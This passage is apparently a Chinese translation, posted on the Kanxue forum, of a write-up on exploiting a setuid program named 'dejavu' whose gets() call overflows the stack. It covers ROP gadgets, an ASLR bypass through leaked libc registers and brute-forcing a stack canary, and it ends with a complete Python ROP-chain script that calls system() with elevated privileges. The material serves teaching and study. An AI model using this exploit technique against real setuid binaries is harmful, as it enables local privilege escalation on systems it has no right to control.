
这等同于执行`system("s/kernel/rtsig-max")`，也就是说`dejavu`会用`setuid`权限运行位于`s/kernel/rtsig-max`相对路径的文件。我们只需把自己的代码放在`s/kernel/rtsig-max`，然后通过执行`system`函数来调用它就能运行了。`"s/kernel/rtsig-max"`这个字符串是我随便挑选的；任和存在于`libc`里可被判定为相对路径的字符串都可以被选用。

当然，我们也可以将常用的`"/bin/sh"`路径放到栈上，但这会使我们的攻击手段更复杂，这里就先不细讲了。

# 返回导向编程简介

返回导向编程的核心原理是将许多"零件"的地址放在栈上，每个零件都是一段在可访问内存里的（通常较短的）汇编指令，以`ret`结束。当`ret`被执行时，栈上下一个零件的地址会从栈上弹出放入`eip`，那里的汇编指令就会被执行直至`ret`，再执行下一个零件以此类推。我们管这些零件叫做`gadgets`；我们的目的就是通过连接一串`gadgets`来执行我们想要的命令，而这串`gadgets`就是我们所用的`ROP`链。

总的来说，通过`ROP`我们可以连续跳跃至任意个以`ret`结尾的指令段，只要指令段中没有会大幅影响栈的指令。常见的会影响栈的指令是`leave`和任何会大幅改动`esp`的指令。

我们可以使用工具帮助我们寻找执行文件中的`gadgets`。这十分有用，因为有时`gadgets`甚至隐藏在其他指令中（同样的十六进制代码根据断句位置不同会成为不同的汇编指令）。一个常见的`gadgets`搜索工具是`ROPgadget`，它的用法如下。

```
$ python ROPgadget.py --binary ../dejavu --badbytes 0a

...

Unique gadgets found:86

找到86个独特gadgets
```

由于我们不能向`gets`函数写入换行符，我们将换行符`0x0a`设为"坏字节"以避免含有`0x0a`的指令段（但我们可以写入`NULL`）。我们找到了不少`gadgets`，但大多没什么卵用。我将我们会用到的过滤了出来：

```
0x0804841c : dec ecx ; ret

0x0804835e : add dh, bl ; ret

0x0804857b : call dword ptr [edx]

0x080482d2 : pop ebx ; ret

0x080482bb : ret
```

注意一下最后一个`gadget`，它相当于`ROP`中的`nop`指令：它的作用仅是将`esp`增加4个字节并访问下一个`gadget`。我们之后会看到它的用途。

# 执行攻击

我们在接下来的部分会经常参考下面这段`dejavu`程序的反汇编，省略了`dejavu`调用的`libc`库的部分。

```
deja_vu:

   0x0804840c <+0>:         push   ebp

   0x0804840d <+1>:         mov    ebp,esp

   0x0804840f <+3>:         sub    esp,0x28

   0x08048412 <+6>:         lea    eax,[ebp-0x10]

   0x08048415 <+9>:         mov    DWORD PTR [esp],eax

   0x08048418 <+12>:        call   0x80482f0 <gets@plt>

   0x0804841d <+17>:        leave

   0x0804841e <+18>:        ret

main:

   0x0804841f <+0>:         push   ebp

   0x08048420 <+1>:         mov    ebp,esp

   0x08048422 <+3>:         and    esp,0xfffffff0

   0x08048425 <+6>:         call   0x804840c <deja_vu>

   0x0804842a <+11>:        mov    eax,0x0

   0x0804842f <+16>:        leave

   0x08048430 <+17>:        ret
```

我们来看看程序执行至`deja_vu+18`时栈的布局（在`ret`被执行之前）。大概是这样：

```
/---------------------\

|        . . .        |

|  saved return addr. |  <--- esp

|        . . .        |

|        door         |  <--- eax, edx

|        . . .        |

|        . . .        |

|        . . .        |

|      libc_end      |  <--- ecx

|        . . .        |

|       system        |  <--- 我们想调用这个地址

|        . . .        |

|     libc_start     |  <--- ebx

|        . . .        |

|        . . .        |

|        . . .        |

|    dejavu .text     |

\---------------------/
```

虽然`libc`在内存中的位置是随机的，但`ebx`和`ecx`会在动态加载器解析`gets@plt`的调用时泄露关于`libc`地址的信息。这个具体原理有些复杂，这篇文章先不深入讨论。

另一方面，虽然`libc`的绝对地址会因`ASLR`被随机化，其中各个指令的相对地址并不是随机的。比如，`system`函数永远都位于`libc_end` 的`0x168494`个字节之前 。如上图所示，`ecx`指向`libc_end`，那么为了调用`system`我们需要把`ecx`的值减少`0x168494`。

我们如何能减少`ecx`的值呢？这个能将`ecx`减少1的`gadget`看起来很有前途：

```
0x0804841c : dec ecx ; ret
```

我们需要调用这个`gadget` `0x168494`次才能把`ecx`的值调整为`system`函数的地址，也就需要将这个`gadget`的地址放在栈上`0x168494`次，可我们可用的栈空间似乎远比这少。

我们可以通过返回`main`来解决这个问题。因为`gcc`会以16字节为间隔将栈对齐，所以每次我们调用`main`都会获得额外的栈空间。下图为`main+3`（用于对齐栈的`and esp,0xfffffff0`）执行前栈的样子：

```
/---------------------\

|        . . .        |

|       4 bytes       |  <--- 旧 esp

|         sfp         |  <--- esp, ebp

|       4 bytes       |

|       4 bytes       |

|       4 bytes       |  <--- esp & 0xfffffff0

|        . . .        |

\---------------------/
```

在我们调用`main`之后，程序会再次调用有溢出漏洞的`deja_vu`函数。我们只需继续重复调用`main`就可以获得更多的栈空间，直至有足够空间来放置`0x168494`个将`ecx`减少1的`gadget`。因为每次调用`gets`函数都会覆盖旧的`ecx`，我们必须连续完成所有对`ecx`的减少。

我们再用同样的方法将`"s/kernel/rtsig-max"`字符串的地址放到栈上。

在将`ecx`指向`system`函数的地址后，我们需要想办法调用这个地址。我们有个会执行`call dword ptr [edx]` 的`gadget`，所以若是能把`ecx`的值放入`edx`就能调用`system`了。我找到的唯一可用的能将`ecx`放上栈的指令是位于`_start`函数里的`push ecx`指令。`_start`是操作系统在调用`main`之前调用的一个函数，它的主要作用是加载`libc`库并开始程序的正常运行。

```
_start:

       0x08048320 <+0>:     xor    ebp,ebp

       0x08048322 <+2>:     pop    esi

       0x08048323 <+3>:     mov    ecx,esp

       0x08048325 <+5>:     and    esp,0xfffffff0

       0x08048328 <+8>:     push   eax

       0x08048329 <+9>:     push   esp

       0x0804832a <+10>:    push   edx

       0x0804832b <+11>:    push   0x80484b0

       0x08048330 <+16>:    push   0x8048440

       0x08048335 <+21>:    push   ecx

       0x08048336 <+22>:    push   esi

       0x08048337 <+23>:    push   0x804841f

       0x0804833c <+28>:    call   0x8048310 <__libc_start_main@plt>

       0x08048341 <+33>:    hlt
```

为了能让程序正常运行并将`ecx`的值推上栈，我们需要跳到`_start+9`。我们其实可以跳到`_start+5`和`_start+11`间的任何指令，但这会破坏我们栈的对齐并增加攻击难度。

我们知道，`gets`函数的返回值（所写入的字符串的地址）存在`edx`寄存器里。我们可以通过些算术将`edx`的值指向`system`。我们有个使用`ebx`的值来增加`edx`的`gadget`：

```
0x0804835e : add dh, bl ; ret
```

如果你对于`x86`寄存器的印象有点模糊，请看下图。

```
/------------------------\

|          edx           |

|           |     dx     |

|           |  dh  |  dl |

\------------------------/
```

`edx`指的是整个32位寄存器，而相对的`dx`则指的是`edx`的16个低位字节。同理，`dh`和`dl`则相应指的是`dx`的8个高位字节和8个低位字节。也就是说，这个`gadget`允许我们随意更改`edx`中间的8位字节。要注意的是，我们只能更改`dh`的值，而不能通过"溢出"来更改`edx`寄存器更高位的值。

我们还有个能将栈顶的值弹出至`ebx`的`gadget`，所以我们可以完全控制`bl`：我们可以把任意所需值放在栈上，然后通过`pop`弹出至`ebx`。

由于`edx`的值是`door`缓冲区的地址（这个地址是`gets`函数的返回值），我们可以通过改变栈指针来调整`door`也就是`edx`的地址。通过上面所展示的返回`main`的方法，我们可以调整栈指针直到`edx`指向我们从`ecx`推到栈上的`system`函数的地址。

现在我们需要将栈指针与我们存有可执行文件路径的地址对齐，并以它为参数调用`system`。我们可以通过之前提到的`ROP`的`nop gadget`来完成这步：

```
0x080482bb : ret
```

几个`nop`之后，我们的栈指针就正确地指向了我们需要的地址。我们最后用`call dword ptr [edx]`的`gadget`来调用`system`函数，并结束我们的`ROP`链。

要注意的是，`gets`会自动用`NULL`覆盖参数的最后一个字节，以防提供的字符串参数并未以`NULL`结束。因为我们对`gets`的写入以我们的执行文件的路径结束，它的最低位字节会被`0x00`覆盖（这也是为什么我们选了一段已经被用于字符串的数据来当`system`的参数，因为字符串本身就已`0x00`结尾）。

现在我们就进入了`ret2libc`的状况（返回导向至`libc`）：我们能调用`system`函数，并控制它的地址参数。这会使`dejavu`以自身权限运行我们的程序，我们就能执行任意代码了。

# 破解 Stack Canaries

假设我们也启用了`stack canaries`。这会使我们攻击的难度提升多少？

我们可以通过暴力破解来击败这个保护。在`Debian`的操作系统环境下，`stack canary`的最小有效字节是固定的`0x00`，所以我们只有24 bits的熵。我们可以以`0x41414100`这个常量设为`stack canary`，然后重复运行`dejavu`直至攻击成功（当系统选用的`stack canary`碰巧也是`0x41414100`时）。

在常见环境下，一个使用`syscall`的高效`C`程序每秒可以进行约2500次系统调用，那这个情况下大约我们需要大约1.2小时来破解`stack canary`。

# 最终成果

最终使用的`ROP`链如下。我们可以根据需要添加自动建立所需文件夹和可执行文件的功能，或暴力破解`stack canaries`的功能。

```
#!/usr/bin/env python2

# ropchain.py

from struct import pack

p = lambda n: pack("<I", n)
sc = []

PAD = 'A' * 20
DEC_ECX = p(0x0804841c)
RET_MAIN = p(0x0804841f)
RET_START = p(0x08048320 + 9)
POP_EBX = p(0x080482d2)
ADD_DH_BL = p(0x0804835e)
CALL_STAR_EDX = p(0x0804857b)
ROP_NOP = p(0x080482bb)
NEWLINE = '\n'

GET_16B = PAD + RET_MAIN + NEWLINE

OFFSET_BINARY = 0x450c4
OFFSET_SYSTEM = 0x168494

def load_libc_address(offset):
    sc.extend([GET_16B] * ((offset + 3) / 4))
    sc.append(PAD)
    sc.extend([DEC_ECX] * offset)
    sc.append(RET_START)
    sc.append(NEWLINE)

load_libc_address(OFFSET_SYSTEM) 
load_libc_address(OFFSET_BINARY) 

sc.extend([GET_16B] * 3)

sc.append(PAD + POP_EBX + p(1))
sc.append(ADD_DH_BL)
sc.extend([ROP_NOP] * 15)    
sc.append(CALL_STAR_EDX)
sc.append(NEWLINE)

print(''.join(sc))
```

原作者：`Keyhan Vakil`

原文：`bedK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3E0$3j5h3E0A6L8q4)9J5k6h3#2W2i4K6u0r3M7r3!0K6N6s2y4Q4x3V1k6J5L8%4m8U0K9r3q4A6L8W2)9J5c8R3`.`.

本文由 看雪翻译小组 `buusc` 编译

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
